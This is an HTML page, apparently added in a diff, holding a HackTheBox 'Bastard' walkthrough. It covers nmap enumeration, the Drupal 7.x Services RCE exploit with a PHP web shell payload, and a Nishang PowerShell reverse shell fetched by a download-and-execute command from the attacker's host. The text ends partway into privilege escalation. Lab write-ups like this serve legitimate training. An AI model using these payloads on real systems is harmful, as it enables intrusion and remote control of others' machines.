@@ -1,0 +1,489 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+        <h1><strong>hackthebox Bastard</strong></h1>
+        <em>Released: 18th March 2017 / Pwned: August 29th 2019 - [+] Solved whilst Retired</em><br>
+        <br>
+        <img alt="images\2-1.png" src="images/2-1.png"><br>
+        <br>
+        Bastard requires either dumb luck, prior knowledge or a spending a ridiculous amount of time enumerating for a drupal endpoint. The kernel exploit to priv-esc to SYSTEM is also very unclear, which made this whole box feel very ctf-like to me. You'll find a Drupal site running on port 80, and a PHP vulnerability for the Drupal version installed which will give you remote code execution. From there, you can elevate to a system shell, run powershell scripts to search for priv-escs and download an exploit to the target using Impacket's smbserver.py and elevate to SYSTEM.<br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap</strong></h2><br>
+        Initial scan:<br>
+        <code>nmap -sC -sV -O -oN nmap/initial.txt 10.10.10.9</code><br>
+        <br>
+        -sC default scripts<br>
+        -sV service enumeration<br>
+        -O OS detection<br>
+        -oN default output<br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                root@gotham:~/ctf/bastard#&nbsp;mkdir&nbsp;nmap<br>
+                root@gotham:~/ctf/bastard#&nbsp;nmap&nbsp;-sC&nbsp;-sV&nbsp;-O&nbsp;-oN&nbsp;nmap/initial.txt&nbsp;10.10.10.9<br>
+                ...<br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;VERSION<br>
+                80/tcp&nbsp;&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;IIS&nbsp;httpd&nbsp;7.5<br>
+                |_http-generator:&nbsp;Drupal&nbsp;7&nbsp;(http://drupal.org)<br>
+                |&nbsp;http-methods:&nbsp;<br>
+                |_&nbsp;&nbsp;Potentially&nbsp;risky&nbsp;methods:&nbsp;TRACE<br>
+                |&nbsp;http-robots.txt:&nbsp;36&nbsp;disallowed&nbsp;entries&nbsp;(15&nbsp;shown)<br>
+                |&nbsp;/includes/&nbsp;/misc/&nbsp;/modules/&nbsp;/profiles/&nbsp;/scripts/&nbsp;<br>
+                |&nbsp;/themes/&nbsp;/CHANGELOG.txt&nbsp;/cron.php&nbsp;/INSTALL.mysql.txt&nbsp;<br>
+                |&nbsp;/INSTALL.pgsql.txt&nbsp;/INSTALL.sqlite.txt&nbsp;/install.php&nbsp;/INSTALL.txt&nbsp;<br>
+                |_/LICENSE.txt&nbsp;/MAINTAINERS.txt<br>
+                |_http-server-header:&nbsp;Microsoft-IIS/7.5<br>
+                |_http-title:&nbsp;Welcome&nbsp;to&nbsp;10.10.10.9&nbsp;|&nbsp;10.10.10.9<br>
+                135/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;msrpc&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;RPC<br>
+                49154/tcp&nbsp;open&nbsp;&nbsp;msrpc&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;RPC<br>
+                Warning:&nbsp;OSScan&nbsp;results&nbsp;may&nbsp;be&nbsp;unreliable&nbsp;because&nbsp;we&nbsp;could&nbsp;not&nbsp;find&nbsp;at&nbsp;least&nbsp;1&nbsp;open&nbsp;and&nbsp;1&nbsp;closed&nbsp;port<br>
+                Device&nbsp;type:&nbsp;general&nbsp;purpose|phone|specialized<br>
+                Running&nbsp;(JUST&nbsp;GUESSING):&nbsp;Microsoft&nbsp;Windows&nbsp;2008|7|Vista|Phone|8.1|2012&nbsp;(91%)<br>
+                OS&nbsp;CPE:&nbsp;cpe:/o:microsoft:windows_server_2008:r2:sp1&nbsp;...<br>
+                Aggressive&nbsp;OS&nbsp;guesses:&nbsp;Microsoft&nbsp;Windows&nbsp;Server&nbsp;2008&nbsp;R2&nbsp;SP1&nbsp;or&nbsp;Windows&nbsp;8&nbsp;(91%)...<br>
+                Service&nbsp;Info:&nbsp;OS:&nbsp;Windows;&nbsp;CPE:&nbsp;cpe:/o:microsoft:windows<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        Nothing new was revealed with an all-ports scan.<br>
+        <br>
+        <strong>Ports</strong><br>
+        • 80/http - A webserver running Drupal, which is most likely vulnerable<br>
+        • 135/rpc - Nothing much to be gained here, can run Impacket's <code>rpcdump.py</code> against it if you want<br>
+        • 49154/rpc - More RPC, nothing to be gained here either. 49154 is the Remote Task Scheduler service<br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>2) 80/http - Drupal</strong></h2><br>
+        <code>http://10.10.10.9</code> is a Drupal page.<br>
+        <img alt="images\2-2.png" src="images/2-2.png"><br>
+        <br>
+        If you browse to <code>CHANGELOG.txt</code>, you'll find the Drupal version - 7.54.<br>
+        <img alt="images\2-3.png" src="images/2-3.png"><br>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>3) 41564.php</strong></h2><br>
+        If you <code>searchsploit</code> for Drupal 7 vulnerabilities, you'll find quite a few.<br>
+            <div class="codebox">
+                root@gotham:~#&nbsp;searchsploit&nbsp;drupal&nbsp;7<br>
+                -----------------------------------------------&nbsp;----------------------------------------<br>
+                &nbsp;Exploit&nbsp;Title&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;Path<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;(/usr/share/exploitdb/)<br>
+                -----------------------------------------------&nbsp;----------------------------------------<br>
+                Drupal&nbsp;4.7&nbsp;-&nbsp;'Attachment&nbsp;mod_mime'&nbsp;Remote&nbsp;Comm&nbsp;|&nbsp;exploits/php/webapps/1821.php<br>
+                Drupal&nbsp;4.x&nbsp;-&nbsp;URL-Encoded&nbsp;Input&nbsp;HTML&nbsp;Injection&nbsp;&nbsp;|&nbsp;exploits/php/webapps/27020.txt<br>
+                Drupal&nbsp;7.0&nbsp;&lt;&nbsp;7.31&nbsp;-&nbsp;'Drupalgeddon'&nbsp;SQL&nbsp;Injecti&nbsp;|&nbsp;exploits/php/webapps/34984.py<br>
+                Drupal&nbsp;7.0&nbsp;&lt;&nbsp;7.31&nbsp;-&nbsp;'Drupalgeddon'&nbsp;SQL&nbsp;Injecti&nbsp;|&nbsp;exploits/php/webapps/34992.py<br>
+                Drupal&nbsp;7.0&nbsp;&lt;&nbsp;7.31&nbsp;-&nbsp;'Drupalgeddon'&nbsp;SQL&nbsp;Injecti&nbsp;|&nbsp;exploits/php/webapps/34993.php<br>
+                Drupal&nbsp;7.0&nbsp;&lt;&nbsp;7.31&nbsp;-&nbsp;'Drupalgeddon'&nbsp;SQL&nbsp;Injecti&nbsp;|&nbsp;exploits/php/webapps/35150.php<br>
+                Drupal&nbsp;7.0&nbsp;&lt;&nbsp;7.31&nbsp;-&nbsp;'Drupalgeddon'&nbsp;SQL&nbsp;Injecti&nbsp;|&nbsp;exploits/php/webapps/44355.php<br>
+                Drupal&nbsp;7.12&nbsp;-&nbsp;Multiple&nbsp;Vulnerabilities&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;exploits/php/webapps/18564.txt<br>
+                Drupal&nbsp;7.x&nbsp;Module&nbsp;Services&nbsp;-&nbsp;Remote&nbsp;Code&nbsp;Execu&nbsp;|&nbsp;exploits/php/webapps/41564.php<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        The interesting one is <code>41564.php</code> - <a href="https://www.exploit-db.com/exploits/41564">https://www.exploit-db.com/exploits/41564</a><br>
+        This exploit will upload a php file to the target that can you can use for remote code execution on the server.<br>
+        <br>
+        The exploit needs to be edited, so copy the exploit to a working directory of yours.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/bastard/80-http#&nbsp;mkdir&nbsp;drupal-exploits<br>
+                root@gotham:~/ctf/bastard/80-http#&nbsp;cd&nbsp;drupal-exploits<br>
+                root@gotham:~/ctf/bastard/80-http/drupal-exploits#&nbsp;cp&nbsp;/usr/share/exploitdb/exploits/php/webapps/41564.php&nbsp;.
+            </div>
+        </div><br>
+        <br>
+        Open the exploit with <code>nano</code> and change <code>url</code> to that of the target, <code>endpoint_path</code> to <code>/rest</code>, <code>filename</code> to whatever you like and <code>data</code> to the php code to run inside your file.<br>
+        Also make sure lines 24 and 70 are commented out (delete the new line, basically)<br>
+            <div class="codebox">
+                root@gotham:~/ctf/bastard/80-http/drupal-exploits#&nbsp;nano&nbsp;41564.php&nbsp;<br>
+                ...<br>
+                define('ACTION',&nbsp;'login');<br>
+                <br>
+                $url&nbsp;=&nbsp;'http://10.10.10.9';<br>
+                $endpoint_path&nbsp;=&nbsp;'/rest';<br>
+                $endpoint&nbsp;=&nbsp;'rest_endpoint';<br>
+                <br>
+                $file&nbsp;=&nbsp;[<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;'filename'&nbsp;=&gt;&nbsp;'touc.php',<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;'data'&nbsp;=&gt;&nbsp;'&lt;?php&nbsp;echo(system($_GET["cmd"]));&nbsp;?&gt;'<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        Run the exploit.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/bastard/80-http/drupal-exploits#&nbsp;php&nbsp;41564.php&nbsp;<br>
+                ...<br>
+                #/usr/bin/php<br>
+                PHP&nbsp;Fatal&nbsp;error:&nbsp;&nbsp;Uncaught&nbsp;Error:&nbsp;Call&nbsp;to&nbsp;undefined&nbsp;function&nbsp;curl_init()&nbsp;in&nbsp;/root/ctf/bastard/80-http/drupal-exploits/41564.php:254<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        I got a php-curl error, which was fixed by install php-curl.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/bastard/80-http/drupal-exploits#&nbsp;sudo&nbsp;apt-get&nbsp;install&nbsp;php-curl<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        Run the exploit.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/bastard/80-http/drupal-exploits#&nbsp;php&nbsp;41564.php&nbsp;<br>
+                #&nbsp;Exploit&nbsp;Title:&nbsp;Drupal&nbsp;7.x&nbsp;Services&nbsp;Module&nbsp;Remote&nbsp;Code&nbsp;Execution<br>
+                #&nbsp;Vendor&nbsp;Homepage:&nbsp;https://www.drupal.org/project/services<br>
+                #&nbsp;Exploit&nbsp;Author:&nbsp;Charles&nbsp;FOL<br>
+                #&nbsp;Contact:&nbsp;https://twitter.com/ambionics&nbsp;<br>
+                #&nbsp;Website:&nbsp;https://www.ambionics.io/blog/drupal-services-module-rce<br>
+                <br>
+                <br>
+                #!/usr/bin/php<br>
+                Stored&nbsp;session&nbsp;information&nbsp;in&nbsp;session.json<br>
+                Stored&nbsp;user&nbsp;information&nbsp;in&nbsp;user.json<br>
+                Cache&nbsp;contains&nbsp;7&nbsp;entries<br>
+                File&nbsp;written:&nbsp;http://10.10.10.9/touc.php
+            </div>
+        </div><br>
+        <br>
+        Success! The exploit has run and our php file has been created.<br>
+        We can run commands on the server visiting <code>http://10.10.10.9.php?cmd=&lt;command&gt;</code><br>
+        <img alt="images\2-4.png" src="images/2-4.png"><br>
+        <br>
+        <img alt="images\2-5.png" src="images/2-5.png"><br>
+        <br>
+        <a id="h1-2" name="h1-2"></a><strong></strong>
+        <h1><strong>Gain Access</strong></h1>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>4) PowerShell Reverse Shell</strong></h2><br>
+        The next task is to get a shell on the target.<br>
+        <br>
+        Download Nishang's <code>Invoke-PowerShellTcp.ps1</code> script - <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1</a><br>
+            <div class="codebox">
+                root@gotham:~/ctf/bastard/nishang#&nbsp;wget&nbsp;https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        Edit <code>Invoke-PowerShellTcp.ps1</code> and write the IP and port of your attacking machine for the shell to connect to at the bottom of the script.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/bastard/nishang#&nbsp;nano&nbsp;Invoke-PowerShellTcp.ps1&nbsp;<br>
+                ...<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;catch<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;{<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Write-Warning&nbsp;"Something&nbsp;went&nbsp;wrong!&nbsp;Check&nbsp;if&nbsp;the&nbsp;server&nbsp;is&nbsp;reachable&nbsp;and&nbsp;you&nbsp;are&nbsp;using&nbsp;the&nbsp;correct&nbsp;port."<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Write-Error&nbsp;$_<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;}<br>
+                }<br>
+                <br>
+                Invoke-PowerShellTcp&nbsp;-Reverse&nbsp;-IPAddress&nbsp;10.10.14.8&nbsp;-Port&nbsp;9001
+            </div>
+        </div><br>
+        <br>
+        Start a listener on your attacking machine to receive the shell.<br>
+            <div class="codebox">
+                root@gotham:~#&nbsp;nc&nbsp;-lvnp&nbsp;9001<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        Serve Nishang's <code>PowerShellTcp.ps1</code> script to the target using <code>python -m SimpleHTTPServer</code>.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/bastard/nishang#&nbsp;python&nbsp;-m&nbsp;SimpleHTTPServer<br>
+                Serving&nbsp;HTTP&nbsp;on&nbsp;0.0.0.0&nbsp;port&nbsp;8000&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        Send a command via the exploited Drupal web-app that downloads Nishang's PowerShell script from your attacking machihne and executes it.<br>
+        <code>http://10.10.10.9/touc.php?cmd=powershell “IEX(New-Object Net.WebClient).downloadString('http://10.10.14.8:8000/Invoke-PowerShellTcp.ps1')�</code><br>
+        <br>
+        You should see <code>PowerShellTcp.ps1</code> being retrievd from your attacking machine's web server<br>
+            <div class="codebox">
+                ...<br>
+                Serving&nbsp;HTTP&nbsp;on&nbsp;0.0.0.0&nbsp;port&nbsp;8000&nbsp;...<br>
+                10.10.10.9&nbsp;-&nbsp;-&nbsp;[29/Aug/2019&nbsp;12:32:42]&nbsp;"GET&nbsp;/Invoke-PowerShellTcp.ps1&nbsp;HTTP/1.1"&nbsp;200&nbsp;-
+            </div>
+        </div><br>
+        <br>
+        And get a shell on your listener!<br>
+            <div class="codebox">
+                ...<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...<br>
+                connect&nbsp;to&nbsp;[10.10.14.8]&nbsp;from&nbsp;(UNKNOWN)&nbsp;[10.10.10.9]&nbsp;55738<br>
+                Windows&nbsp;PowerShell&nbsp;running&nbsp;as&nbsp;user&nbsp;BASTARD$&nbsp;on&nbsp;BASTARD<br>
+                Copyright&nbsp;(C)&nbsp;2015&nbsp;Microsoft&nbsp;Corporation.&nbsp;All&nbsp;rights&nbsp;reserved.<br>
+                <br>
+                PS&nbsp;C:\inetpub\drupal-7.54&gt;&nbsp;&nbsp;
+            </div>
+        </div><br>
+        <br>
+        Go grab <code>user.txt</code>.<br>
+            <div class="codebox">
+                PS&nbsp;C:\inetpub\drupal-7.54&gt;&nbsp;dir&nbsp;C:\Users<br>
+                <br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;Directory:&nbsp;C:\Users<br>
+                <br>
+                <br>
+                Mode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LastWriteTime&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Length&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                ----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-------------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;------&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                d----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;19/3/2017&nbsp;&nbsp;&nbsp;1:20&nbsp;??&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Administrator&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                d----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;19/3/2017&nbsp;&nbsp;&nbsp;1:54&nbsp;??&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Classic&nbsp;.NET&nbsp;AppPool&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                d----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;19/3/2017&nbsp;&nbsp;&nbsp;7:35&nbsp;??&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dimitris&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                d-r--&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;14/7/2009&nbsp;&nbsp;&nbsp;7:57&nbsp;??&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Public&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                <br>
+                <br>
+                PS&nbsp;C:\inetpub\drupal-7.54&gt;&nbsp;cat&nbsp;C:\Users\dimitris\Desktop\user.txt<br>
+                ba22fde...
+            </div>
+        </div><br>
+        <br>
+        <a id="h1-3" name="h1-3"></a><strong></strong>
+        <h1><strong>Priv-Esc</strong></h1>
+        <br>
+        <a id="h2-5" name="h2-5"></a><strong></strong>
+        <h2><strong>5a) Find vulns with Sherlock.ps1</strong></h2><br>
+        Run <code>systeminfo</code> on the target<br>
+            <div class="codebox">
+                PS&nbsp;C:\inetpub\drupal-7.54&gt;&nbsp;systeminfo<br>
+                <br>
+                Host&nbsp;Name:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;BASTARD<br>
+                OS&nbsp;Name:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;Server&nbsp;2008&nbsp;R2&nbsp;Datacenter&nbsp;<br>
+                OS&nbsp;Version:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;6.1.7600&nbsp;N/A&nbsp;Build&nbsp;7600<br>
+                OS&nbsp;Manufacturer:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Corporation<br>
+                OS&nbsp;Configuration:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Standalone&nbsp;Server<br>
+                OS&nbsp;Build&nbsp;Type:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Multiprocessor&nbsp;Free<br>
+                Registered&nbsp;Owner:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Windows&nbsp;User<br>
+                Registered&nbsp;Organization:&nbsp;&nbsp;&nbsp;<br>
+                Product&nbsp;ID:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;00496-001-0001283-84782<br>
+                Original&nbsp;Install&nbsp;Date:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;18/3/2017,&nbsp;7:04:46&nbsp;??<br>
+                System&nbsp;Boot&nbsp;Time:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;29/8/2019,&nbsp;12:11:20&nbsp;??<br>
+                System&nbsp;Manufacturer:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VMware,&nbsp;Inc.<br>
+                System&nbsp;Model:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VMware&nbsp;Virtual&nbsp;Platform<br>
+                System&nbsp;Type:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x64-based&nbsp;PC<br>
+                Processor(s):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2&nbsp;Processor(s)&nbsp;Installed.<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[01]:&nbsp;AMD64&nbsp;Family&nbsp;23&nbsp;Model&nbsp;1&nbsp;Stepping&nbsp;2&nbsp;AuthenticAMD&nbsp;~2000&nbsp;Mhz<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[02]:&nbsp;AMD64&nbsp;Family&nbsp;23&nbsp;Model&nbsp;1&nbsp;Stepping&nbsp;2&nbsp;AuthenticAMD&nbsp;~2000&nbsp;Mhz<br>
+                BIOS&nbsp;Version:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Phoenix&nbsp;Technologies&nbsp;LTD&nbsp;6.00,&nbsp;12/12/2018<br>
+                Windows&nbsp;Directory:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows<br>
+                System&nbsp;Directory:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\system32<br>
+                Boot&nbsp;Device:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\Device\HarddiskVolume1<br>
+                System&nbsp;Locale:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;el;Greek<br>
+                Input&nbsp;Locale:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;en-us;English&nbsp;(United&nbsp;States)<br>
+                Time&nbsp;Zone:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(UTC+02:00)&nbsp;Athens,&nbsp;Bucharest,&nbsp;Istanbul<br>
+                Total&nbsp;Physical&nbsp;Memory:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2.047&nbsp;MB<br>
+                Available&nbsp;Physical&nbsp;Memory:&nbsp;1.531&nbsp;MB<br>
+                Virtual&nbsp;Memory:&nbsp;Max&nbsp;Size:&nbsp;&nbsp;4.095&nbsp;MB<br>
+                Virtual&nbsp;Memory:&nbsp;Available:&nbsp;3.535&nbsp;MB<br>
+                Virtual&nbsp;Memory:&nbsp;In&nbsp;Use:&nbsp;&nbsp;&nbsp;&nbsp;560&nbsp;MB<br>
+                Page&nbsp;File&nbsp;Location(s):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:\pagefile.sys<br>
+                Domain:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HTB<br>
+                Logon&nbsp;Server:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;N/A<br>
+                Hotfix(s):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;N/A<br>
+                Network&nbsp;Card(s):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1&nbsp;NIC(s)&nbsp;Installed.<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[01]:&nbsp;Intel(R)&nbsp;PRO/1000&nbsp;MT&nbsp;Network&nbsp;Connection<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Connection&nbsp;Name:&nbsp;Local&nbsp;Area&nbsp;Connection<br>
